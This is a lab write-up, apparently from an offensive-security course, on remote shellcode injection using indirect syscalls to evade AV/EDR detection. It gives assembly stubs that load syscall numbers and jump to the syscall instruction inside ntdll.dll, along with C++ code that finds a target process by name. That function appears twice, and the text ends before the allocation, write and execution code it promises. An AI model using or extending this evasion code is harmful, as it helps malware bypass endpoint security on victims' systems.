## Overview
In this lab, we cover remote process injection using indirect syscalls, Most of the AV/EDRâ€™s detects direct syscalls by looking syscall instruction in stub by static analysis, also syscall and return instructions are normally never executed outside the memory area of ntdll.dll. So these are big indicator for EDRs solutions. The indirect syscall technique is more or less an evolution of the direct syscall technique compared to direct syscalls. Execution of the syscall command takes place within the memory of the ntdll.dll. 

## Steps
1. Create ASM with all nessecary producres.
2. Searches for a process by name and retrieves its Process ID (PID).
3. Resolve address of syscall instruction and SSN from ntdll.dll on runtime.
3. Allocate RWX region into remote process using indirect syscall.
4. Write Shellcode into allocated memory using indirect syscall.
5. Execute the shellcode using indirect syscall.

One important thing I want to highlight, if you see direct syscalls ASM file `syscall` instruction is take place inside the stub but in this technique there is no syscall instruction directly running from the process but there is unconditional jump will replace the address of syscall instructon inside the ntdll.dll, which is legitimate flow of kernel transition.

```cpp
.CODE  ; Start the code section

; Procedure for the NtOpenProcess syscall
NtOpen PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, SSNtOpenProcess               ; Move the syscall number into the eax register.
    jmp QWORD PTR [AddrNtOpenProcess]  ; Jump to the actual syscall.
NtOpen ENDP                        ; End of the procedure.


; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVM PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, SSNtAllocateVirtualMemory               ; Move the syscall number into the eax register.
    jmp QWORD PTR [AddrNtAllocateVirtualMemory]  ; Jump to the actual syscall.
NtAllocateVM ENDP                        ; End of the procedure.


; Similar procedures for NtWriteVirtualMemory syscalls
NtWriteVM PROC
    mov r10, rcx
    mov eax, SSNtWriteVirtualMemory
    jmp QWORD PTR [AddrNtWriteVirtualMemory]
NtWriteVM ENDP
```

This function searches for a process by name and retrieves its Process ID (PID).

```cpp
DWORD GetProcessIdByName(const wchar_t* processName) {
	DWORD processIds[1024];
	DWORD bytesReturned;
	DWORD processCount;


	if (!EnumProcesses(processIds, sizeof(processIds), &bytesReturned)) {
		wprintf(L"Failed to enumerate processes. Error: %lu\n", GetLastError());
		return 0;
	}

	processCount = bytesReturned / sizeof(DWORD);

	// Iterate through the process IDs
	for (DWORD i = 0; i < processCount; ++i) {
		if (processIds[i] == 0) continue;

		// Open the process with query information and VM read access
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processIds[i]);
		if (hProcess) {
			WCHAR processNameBuffer[MAX_PATH];
			// Get the executable name of the process
			if (GetModuleFileNameEx(hProcess, NULL, processNameBuffer, MAX_PATH)) {
				// Compare process names
				if (wcsstr(processNameBuffer, processName) != NULL) {
					CloseHandle(hProcess);
					return processIds[i];
				}
			}
			CloseHandle(hProcess);
		}
	}

	wprintf(L"Process not found.\n");
	return 0;
}
```

```cpp
DWORD GetProcessIdByName(const wchar_t* processName) {
	DWORD processIds[1024];
	DWORD bytesReturned;
	DWORD processCount;


	if (!EnumProcesses(processIds, sizeof(processIds), &bytesReturned)) {
		wprintf(L"Failed to enumerate processes. Error: %lu\n", GetLastError());
		return 0;
	}

	processCount = bytesReturned / sizeof(DWORD);

	// Iterate through the process IDs
	for (DWORD i = 0; i < processCount; ++i) {
		if (processIds[i] == 0) continue;

		// Open the process with query information and VM read access
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processIds[i]);
		if (hProcess) {
			WCHAR processNameBuffer[MAX_PATH];
			// Get the executable name of the process
			if (GetModuleFileNameEx(hProcess, NULL, processNameBuffer, MAX_PATH)) {
				// Compare process names
				if (wcsstr(processNameBuffer, processName) != NULL) {
					CloseHandle(hProcess);
					return processIds[i];
				}
			}
			CloseHandle(hProcess);
		}
	}

	wprintf(L"Process not found.\n");
	return 0;
}
``` 
